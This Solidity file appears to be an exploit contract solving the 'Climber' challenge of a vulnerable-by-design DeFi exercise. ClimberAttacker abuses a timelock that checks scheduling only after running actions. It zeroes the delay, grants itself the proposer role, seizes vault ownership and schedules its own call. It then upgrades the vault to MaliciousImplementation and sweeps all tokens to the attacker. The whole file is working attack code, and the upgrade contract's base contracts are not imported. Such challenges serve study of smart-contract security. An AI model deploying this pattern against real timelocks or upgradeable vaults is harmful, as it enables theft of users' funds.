// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./ClimberTimelock.sol";
import "./ClimberVault.sol";

contract ClimberAttacker {

    using Address for address payable;

    address private immutable owner;
    ClimberTimelock private immutable timelock;
    ClimberVault private immutable vault;
    IERC20 private immutable token;
    MaliciousImplementation private immutable newImplementation;

    address[] private targets;
    uint256[] private values;
    bytes[] private dataElements;
    bytes32 private salt = keccak256("this is a good challenge");

    constructor(address payable timelockAddress, address vaultAddress, address tokenAddress) {
        owner = msg.sender;
        timelock = ClimberTimelock(timelockAddress);
        vault = ClimberVault(vaultAddress);
        token = IERC20(tokenAddress);

        // create malicious target during creation
        newImplementation = new MaliciousImplementation();
    }

    function executeOperation() public {

        // reduce delay to 0
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(abi.encodeWithSelector(timelock.updateDelay.selector, 0));

        // assign this contract proposer role
        targets.push(address(timelock));
        dataElements.push(
            abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this))
        );
        values.push(0);

        // transfer vault ownership to this
        targets.push(address(vault));
        dataElements.push(
            abi.encodeWithSignature(
                "transferOwnership(address)",
                address(this)
            )
        );
        values.push(0);

        // schedule so that execute can be completed
        targets.push(address(this));
        dataElements.push(
            abi.encodeWithSignature(
                "schedule()" 
            )
        );
        values.push(0);

        timelock.execute(targets, values, dataElements, salt);

        require(vault.owner() == address(this), "owner not set for vault");

        // upgrade vault target to malicious contract and transfer tokens to attacker address
        vault.upgradeToAndCall(
            address(newImplementation),
            abi.encodeWithSignature("sweepFunds(address,address)", address(token), owner)
        );

    }

    function schedule() external {
        timelock.schedule(targets, values, dataElements, salt);
    }

}

contract MaliciousImplementation is Initializable, OwnableUpgradeable, UUPSUpgradeable {

    function sweepFunds(address tokenAddress, address to) external onlyOwner {
        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(to, token.balanceOf(address(this))), "Transfer failed");
    }

    function _authorizeUpgrade(address newImplementation) internal onlyOwner override {}
}